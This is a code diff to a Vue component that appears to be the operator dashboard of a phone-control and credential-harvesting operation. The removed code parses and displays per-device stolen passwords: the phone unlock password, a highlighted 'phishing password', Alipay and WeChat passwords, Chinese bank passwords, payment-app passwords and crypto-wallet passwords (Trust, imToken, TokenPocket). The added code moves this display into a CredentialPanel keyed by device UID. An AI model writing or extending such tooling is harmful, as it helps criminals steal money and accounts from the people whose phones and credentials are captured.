@@ -1,5 +1,5 @@
 <script setup lang="ts">
-import { ref, computed } from 'vue';
+import { ref } from 'vue';
 import {
     NButton,
     NInput,
@@ -32,9 +32,11 @@ import {
 } from '@vicons/ionicons5';
 import { ChatbubbleEllipsesOutline as LogoWechat } from '@vicons/ionicons5';
 import { quickApps } from '@/constants/quickApps';
+import CredentialPanel from './CredentialPanel.vue';
 
 interface Props {
     phonePassword?: string;
+    deviceUid?: string;
 }
 
 interface Emits {
@@ -57,6 +59,7 @@ interface Emits {
 
 const props = withDefaults(defineProps<Props>(), {
     phonePassword: '',
+    deviceUid: '',
 });
 
 const emit = defineEmits<Emits>();
@@ -112,89 +115,6 @@ const bankButtons = [
     { name: 'BC', code: '19', color: '#ff6b00', icon: CashOutline },
 ];
 
-// 密码标签列表，按顺序解析 phone_password 字符串
-const passwordLabels = [
-    '手机密码', '钓鱼密码', 'Alipay密码', 'Wechat密码', '云密码',
-    '建密码', '邮密码', '农密码', '中密码', '工密码', '招密码',
-    'gp密码', 'pe密码', 'an密码', 'mb密码', 'bc密码',
-    'Trust密码', 'Imtoken密码', 'Tokenpocket密码'
-];
-
-// 密码项配置（用于显示）
-const passwordItems = [
-    { label: '手机密码', highlight: false },
-    { label: '钓鱼密码', highlight: true },
-    { label: 'Alipay密码', highlight: false },
-    { label: 'Wechat密码', highlight: false },
-    { label: '云密码', highlight: false },
-    { label: '建密码', highlight: false },
-    { label: '邮密码', highlight: false },
-    { label: '农密码', highlight: false },
-    { label: '中密码', highlight: false },
-    { label: '工密码', highlight: false },
-    { label: '招密码', highlight: false },
-    { label: 'gp密码', highlight: false },
-    { label: 'pe密码', highlight: false },
-    { label: 'an密码', highlight: false },
-    { label: 'mb密码', highlight: false },
-    { label: 'bc密码', highlight: false },
-    { label: 'Trust密码', highlight: false },
-    { label: 'Imtoken密码', highlight: false },
-    { label: 'Tokenpocket密码', highlight: false },
-];
-
-/**
- * 解析 phone_password 字符串，提取各个密码值
- * 参考 info.php 的 updatePwdCard 逻辑
- */
-const parsedPasswords = computed(() => {
-    const result: Record<string, string> = {};
-    const pwdStr = props.phonePassword || '';
-    
-    if (!pwdStr || pwdStr === '--') {
-        passwordLabels.forEach(label => {
-            result[label] = '';
-        });
-        return result;
-    }
-    
-    passwordLabels.forEach((label, i) => {
-        const nextLabel = passwordLabels[i + 1];
-        let value = '';
-        
-        const startIdx = pwdStr.indexOf(label + ':');
-        if (startIdx !== -1) {
-            const afterLabel = pwdStr.substring(startIdx + label.length + 1);
-            if (nextLabel) {
-                const nextIdx = afterLabel.indexOf(nextLabel + ':');
-                value = nextIdx !== -1 
-                    ? afterLabel.substring(0, nextIdx).trim() 
-                    : afterLabel.trim();
-            } else {
-                value = afterLabel.trim();
-            }
-        }
-        
-        // 清理空白字符
-        value = value.replace(/^\s+|\s+$/g, '').replace(/\s+/g, ' ');
-        result[label] = value;
-    });
-    
-    return result;
-});
-
-const getPasswordValue = (label: string): string => {
-    const value = parsedPasswords.value[label];
-    if (!value || value === '--' || value === '') {
-        return '--';
-    }
-    return value;
-};
-
-const hasPassword = (label: string): boolean => {
-    const value = parsedPasswords.value[label];
-    return !!value && value !== '--' && value !== '';
-};
 </script>
 
 <template>
@@ -412,28 +332,10 @@ const hasPassword = (label: string): boolean => {
 
         <!-- 密码信息 -->
         <div class="control-section password-section">
-            <div class="section-header">
-                <NIcon :component="KeyOutline" size="16" />
-                <span>密码信息</span>
-            </div>
-            <div class="password-list">
-                <div
-                    v-for="item in passwordItems"
-                    :key="item.label"
-                    class="password-row"
-                >
-                    <span class="password-label">{{ item.label }}:</span>
-                    <span
-                        class="password-value"
-                        :class="{ 
-                            'has-data': hasPassword(item.label), 
-                            'highlight': item.highlight && hasPassword(item.label) 
-                        }"
-                    >
-                        {{ getPasswordValue(item.label) }}
-                    </span>
-                </div>
-            </div>
+            <CredentialPanel
+                :device-uid="props.deviceUid"
+                :phone-password="props.phonePassword"
+            />
         </div>
     </div>
 </template>
@@ -543,46 +445,4 @@ const hasPassword = (label: string): boolean => {
     flex-direction: column;
 }
 
-.password-list {
-    flex: 1;
-    overflow-y: auto;
-    display: flex;
-    flex-direction: column;
-    gap: 4px;
-}
-
-.password-row {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 6px 0;
-    border-bottom: 1px solid #e2e8f0;
-    font-size: 12px;
-}
-
-.password-row:last-child {
-    border-bottom: none;
-}
-
-.password-label {
-    color: #64748b;
-    min-width: 90px;
-}
-
-.password-value {
-    color: #94a3b8;
-    word-break: break-all;
-    text-align: right;
-    flex: 1;
-}
-
-.password-value.has-data {
-    color: #10B981;
-    font-weight: 500;
-}
-
-.password-value.highlight {
-    color: #F59E0B;
-    font-weight: 600;
-}
 </style>
